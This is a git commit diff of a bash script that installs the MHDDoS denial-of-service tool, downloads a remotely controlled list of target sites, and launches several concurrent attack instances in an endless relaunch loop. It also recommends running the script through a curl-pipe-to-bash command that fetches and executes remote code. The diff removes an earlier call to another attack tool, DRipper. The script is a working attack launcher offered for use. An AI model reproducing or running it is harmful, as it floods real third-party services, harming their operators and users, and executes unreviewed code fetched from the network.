70ee67b4793ff6f78bfadd84f8336f9be09f19cb
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-13 10:35:07 +0200

    Update MHDDoS.sh

--- MHDDoS.sh
+++ MHDDoS.sh
@@ -1,14 +1,14 @@
 #!/bin/bash
 ##### Use next command in local linux terminal to run this script.
-#curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash
+#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash   <<<<<
 ##### To kill script press CTRL+C several times.
 
 
-## Check every 10 sec if MHDDos is terminated. It happens often for some reason. Re-launch if it's not running.
+## Check every N sec if MHDDos is terminated. It happens often for some reason. Re-launch if it's not running.
 check_interval=10
 
-## Number of sites to attack. Choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
-num_of_targets=6
+## Number of sites to attack simultaneously. Choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
+num_of_targets=4
 
 # Install git if it doesn't installed already
 if [ ! -f /usr/bin/git ]; then
@@ -16,19 +16,16 @@ if [ ! -f /usr/bin/git ]; then
 fi
 
 #Install latest version of MHDDoS
-cd~
+cd ~
 rm -rf MHDDoS
 git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip install -r requirements.txt > /dev/null #(no output on screen)
 
 
-
-
 while true
 do
-
-   # Get number of targets in DRipper_targets
+   # Get number of targets in MHDDoS_targets. First 5 strings ommited, those are reserved as comments.
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | wc -l)
 
    echo -e "\nNumber of targets in list: " $list_size "\n"
@@ -51,16 +48,16 @@ do
    # Launch multiple MHDDoS instances
    for i in $random_numbers
    do
-            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | tail -n +6)")
-            # Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
+            # gen randomly pre-choosen line from targets list
+            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
+            
+            # Cut "command line" from string. Command line is verything before "#" that is used as delimiter for comments purpose.
             cmd_line=$(echo $site | awk -F "#" '{print $1}')
-
-            addr=$(echo $site | awk '{print $1}')
-            port=$(echo $site | awk '{print $2}')
-            prot=$(echo $site | awk '{print $3}')
-
-            #echo $addr $port $prot
-            python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+            
+            echo $cmd_line
+            sleep 1
+            
+            python3 ~/MHDDoS/start.py $cmd_line
    done
 
 ## check if MHDDoS running. If it's not yet running or was terminated, launch it.
